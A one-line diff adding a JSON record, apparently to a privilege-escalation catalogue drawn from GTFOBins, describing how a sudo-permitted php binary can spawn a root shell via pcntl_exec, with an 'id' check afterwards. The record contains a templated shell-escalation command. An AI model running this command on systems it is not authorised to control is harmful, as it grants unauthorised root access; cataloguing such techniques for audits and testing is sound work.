@@ -1,0 +1,1 @@
+{"id":"sudo_php","category":"SUDO_NOPASSWD_CUSTOM","binary":"php","cve":null,"exploitation":["sudo {{binary}} -r 'pcntl_exec(\"{{shell}}\");'"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
